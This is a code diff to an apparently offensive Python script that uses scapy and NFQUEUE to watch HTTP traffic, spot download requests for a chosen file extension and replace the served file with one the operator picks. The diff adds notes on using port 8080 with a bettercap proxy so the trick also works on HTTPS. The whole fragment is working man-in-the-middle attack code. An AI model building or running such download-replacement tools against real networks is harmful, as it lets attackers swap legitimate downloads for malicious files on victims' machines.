@@ -40,13 +40,13 @@ def getArgs():
 # Funtion to handle packet in the NFQUEUE
 def handlePacket(packet):
     pkt = IP(packet.get_payload())  # Convert the packet to a scapy packet.
-    if pkt.haslayer(Raw):  # Intercept only packet with HTTP layer with useful data
+    if pkt.haslayer(Raw):  # Intercept only packet with HTTP/S layer with useful data
         try:
-            if pkt[TCP].dport == 80:
-                if options.fileext.encode() in pkt[Raw].load:
+            if pkt[TCP].dport == 80:  # Replace by 8080 in HTTPS (for bettercap proxy)
+                if options.fileext.encode() in pkt[Raw].load or options.url.encode() not in pkt[Raw].load:
                     print(f"\n[+] Found a download request for a {options.fileext} file")
                     ackList.append(pkt[TCP].ack)  # Add the ack number in the list for global use
-            elif pkt[TCP].sport == 80:
+            elif pkt[TCP].sport == 80:  # Replace by 8080 in HTTPS (for bettercap proxy)
                 if pkt[TCP].seq in ackList:
                     ackList.remove(pkt[TCP].seq)  # Delete the ack number without knowing its index
                     print("\n[+] Now replacing file to the file mentioned...")
